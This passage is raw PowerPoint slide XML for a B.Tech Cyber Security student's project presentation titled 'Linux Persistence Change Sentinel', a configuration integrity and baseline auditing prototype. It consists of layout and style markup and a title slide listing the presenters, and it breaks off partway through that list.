            <a:fld id="{0054C995-A101-40E4-88AF-8CCA2230FDF4}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 21">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CCA5FA8B-1308-4FEA-BD7F-309CB5786C04}"/>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17">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4ABA97CD-1067-4741-8A30-677826546595}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{FBA8C804-4DE3-41CC-98C1-05EC14125A5B}" type="slidenum">
              <a:rPr lang="en-US"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>‹#›</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1564479020"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition>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33575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08246714-135A-4141-B338-011310AA9C2F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="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12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8F4F6B3D-18ED-42C1-A268-20AE208D89B8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1" noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="613172" y="1600201"/>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B0DC14AD-E591-4E58-B1A5-35E0EC9234C6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="2"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6096000" y="6248401"/>
            <a:ext cx="2667000" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" anchor="ctr" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr sz="1050" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{46932F45-0E06-4599-AAE4-53FB7B523600}" type="datetime8">
              <a:rPr lang="en-US" smtClean="0"/>
              <a:pPr>
                <a:defRPr/>
              </a:pPr>
              <a:t>10/21/2026 6:21 AM</a:t>
            </a:fld>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3626FEA4-D403-4009-AE9A-7A81A9DD7A7A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="6248401"/>
            <a:ext cx="5420916" cy="365125"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" anchor="ctr"/>
          <a:lstStyle>
            <a:lvl1pPr algn="r" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr sz="1050">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Rectangle 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EE4241F5-43F5-4215-A37F-BA0C8B434726}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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Rectangle 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{559CE3FE-C047-4327-A035-6DFB11A6800F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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9" name="Rectangle 8">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C3AC8A25-7CFF-4E69-B8EE-4718F8D4EF3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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3" name="Slide Number Placeholder 22">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96567ECF-60C7-489E-AFDA-40C4EB807302}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="4"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="1271589"/>
            <a:ext cx="533400" cy="244475"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" anchor="ctr" anchorCtr="0">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr algn="ctr" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr sz="900" b="1">
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:defRPr/>
            </a:pPr>
            <a:fld id="{1683ACCE-3850-4732-B3C7-553D9AFBE5E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Lst>
  <p:hf sldNum="0" hdr="0" ftr="0" dt="0"/>
  <p:txStyles>
    <p:titleStyle>
      <a:lvl1pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300" kern="12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Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="342900" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="685800" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1028700" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="1371600" algn="l" rtl="0" fontAlgn="base">
        <a:spcBef>
          <a:spcPct val="0"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:defRPr sz="3300">
          <a:solidFill>
            <a:schemeClr val="tx2"/>
          </a:solidFill>
          <a:latin typeface="Tw Cen MT" pitchFamily="34" charset="0"/>
        </a:defRPr>
      </a:lvl9pPr>
    </p:titleStyle>
    <p:bodyStyle>
      <a:lvl1pPr marL="239316" indent="-239316" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPts val="525"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:schemeClr val="accent2"/>
        </a:buClr>
        <a:buSzPct val="60000"/>
        <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
        <a:buChar char=""/>
        <a:defRPr sz="2175" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl1pPr>
      <a:lvl2pPr marL="479822" indent="-204788" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPts val="413"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:schemeClr val="accent1"/>
        </a:buClr>
        <a:buSzPct val="70000"/>
        <a:buFont typeface="Wingdings 2" panose="05020102010507070707" pitchFamily="18" charset="2"/>
        <a:buChar char=""/>
        <a:defRPr sz="1950" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="685800" indent="-171450" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPts val="375"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:schemeClr val="accent2"/>
        </a:buClr>
        <a:buSzPct val="75000"/>
        <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
        <a:buChar char=""/>
        <a:defRPr sz="1725" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1028700" indent="-171450" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPts val="300"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:srgbClr val="A04DA3"/>
        </a:buClr>
        <a:buSzPct val="75000"/>
        <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
        <a:buChar char=""/>
        <a:defRPr sz="1500" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1371600" indent="-171450" algn="l" rtl="0" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
        <a:spcBef>
          <a:spcPts val="300"/>
        </a:spcBef>
        <a:spcAft>
          <a:spcPct val="0"/>
        </a:spcAft>
        <a:buClr>
          <a:srgbClr val="C4652D"/>
        </a:buClr>
        <a:buSzPct val="65000"/>
        <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
        <a:buChar char=""/>
        <a:defRPr sz="1500" kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1577340" indent="-171450" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="accent1"/>
        </a:buClr>
        <a:buFont typeface="Wingdings"/>
        <a:buChar char="§"/>
        <a:defRPr sz="1350" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="1783080" indent="-171450" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="accent2"/>
        </a:buClr>
        <a:buFont typeface="Wingdings"/>
        <a:buChar char="§"/>
        <a:defRPr sz="1350" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="1988820" indent="-171450" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="accent3"/>
        </a:buClr>
        <a:buFont typeface="Wingdings"/>
        <a:buChar char="§"/>
        <a:defRPr sz="1350" kern="1200" baseline="0">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="2194560" indent="-171450" algn="l" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
        <a:spcBef>
          <a:spcPct val="20000"/>
        </a:spcBef>
        <a:buClr>
          <a:schemeClr val="accent4"/>
        </a:buClr>
        <a:buFont typeface="Wingdings"/>
        <a:buChar char="§"/>
        <a:defRPr sz="1350" kern="1200" baseline="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342900" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl2pPr>
      <a:lvl3pPr marL="685800" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl3pPr>
      <a:lvl4pPr marL="1028700" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl4pPr>
      <a:lvl5pPr marL="1371600" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl5pPr>
      <a:lvl6pPr marL="1714500" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl6pPr>
      <a:lvl7pPr marL="2057400" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl7pPr>
      <a:lvl8pPr marL="2400300" algn="l" rtl="0" eaLnBrk="1" hangingPunct="1">
        <a:defRPr kern="1200">
          <a:solidFill>
            <a:schemeClr val="tx1"/>
          </a:solidFill>
          <a:latin typeface="+mn-lt"/>
          <a:ea typeface="+mn-ea"/>
          <a:cs typeface="+mn-cs"/>
        </a:defRPr>
      </a:lvl8pPr>
      <a:lvl9pPr marL="27432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85A211-1621-40B3-8498-92D63F04F94A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2778369" y="6146363"/>
            <a:ext cx="6224953" cy="514350"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="just" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1900" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Model Institute of Engineering &amp; Technology (Autonomous)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="17411" name="Picture 3" descr="MIET_icon.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6A8C676B-388B-4B11-B609-B6726FCA0E5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23521" y="2976419"/>
            <a:ext cx="1920479" cy="2959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6" descr="shrast.png">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{863684A2-ACEE-402C-8327-54A48708153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0268" y="6203513"/>
            <a:ext cx="65365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TextBox 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{829753C7-FA66-496E-A2F6-D15FD2486C5E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="0" y="437108"/>
            <a:ext cx="9228083"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300" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>DEPARTMENT OF COMPUTER SCIENCE AND ENGINEERING</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0E7490"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>(CYBER SECURITY)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1150" u="sng">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1100" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>MDC-CS-501 Project Evaluation Presentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>B.Tech CSE (Cyber Security) - 5th Semester | Batch 2024</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1150" u="sng">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Linux Persistence Change Sentinel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1300" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0E7490"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Automated Configuration Integrity &amp; Baseline Auditing Prototype</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1150" u="sng">
              <a:solidFill>
                <a:srgbClr val="0F172A"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1200" b="1" u="sng">
                <a:solidFill>
                  <a:srgbClr val="283C5F"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Presented By:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>1. Arun Kumar ([Roll No. / Student ID])</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr" eaLnBrk="1" hangingPunct="1"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1150" u="sng">
                <a:solidFill>
                  <a:srgbClr val="0F172A"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2. Abhishek Sharma (2024A7R058)</a:t>
            </a:r>
          </a:p>
          <a:p>
